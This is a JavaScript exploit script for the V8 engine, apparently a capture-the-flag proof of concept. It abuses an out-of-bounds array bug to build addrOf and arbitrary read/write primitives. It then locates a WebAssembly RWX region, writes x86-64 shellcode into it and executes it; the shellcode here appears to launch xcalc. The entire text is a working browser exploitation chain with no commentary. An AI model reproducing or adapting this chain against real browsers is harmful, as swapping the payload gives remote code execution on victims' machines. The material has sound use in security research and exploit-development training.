var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { 
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) { 
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function toHex(val) {
        return "0x" + ftoi(val).toString(16);
}

a1 = [1.1,2.2,3.3];
a2 = [{A:1},{B:2},{C:3}];

floatArr = a1.slice(0);
objArr = a2.slice(0);

floatArrMap = floatArr[3];
floatArrElems = floatArr[4];

objMap = itof(ftoi(floatArrMap)+0x50n);
objElems = itof(ftoi(floatArrElems)+0x30n);

floatArr[4] = objElems;

function addrOf(obj){
    objArr[0] = obj;
    return ftoi(floatArr[0]);
}

function arbitraryRead(address){
    temp = [1.1];
    tempArr = temp.slice(0);
    address = address - 8n;
    if(address % 2n == 0){
        address += 1n;
    }
    tempArr[2] = itof(address);
    return ftoi(tempArr[0]);
}

function arbitraryWrite(address,value){
    temp = [1.1];
    tempArr = temp.slice(0);
    address = address - 0x8n;
    if(address % 2n == 0){
        address += 1n;
    }
    tempArr[2] = itof(address);
    tempArr[0] = itof(value);
}


var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);

console.log("Found WASM Instance at 0x"+addrOf(wasmInstance).toString(16));
var ptrToRwxRegion = addrOf(wasmInstance)+0x68n;
var rwxRegion = arbitraryRead(ptrToRwxRegion);
console.log("Found RWX Segment at 0x"+rwxRegion.toString(16));

var buffer = new ArrayBuffer(0x500);
var typedArray = new Uint32Array(buffer);
var arrayBufferAddr = addrOf(buffer);
console.log("Found arrayBuffer address at 0x"+(arrayBufferAddr&0xffffffffn).toString(16));

arbitraryWrite(arrayBufferAddr+0x60n,rwxRegion);
let shellcode = [0x90909090, 0x90909090, 0x782fb848, 0x636c6163, 0x48500000, 0x73752fb8, 0x69622f72, 0x8948506e, 0xc03148e7, 0x89485750, 0xd23148e6, 0x3ac0c748, 0x50000030, 0x4944b848, 0x414c5053, 0x48503d59, 0x3148e289, 0x485250c0, 0xc748e289, 0x00003bc0, 0x050f00];

for(let i=0;i<shellcode.length;i++){
    typedArray[i] = shellcode[i];
}
wasmInstance.exports.main();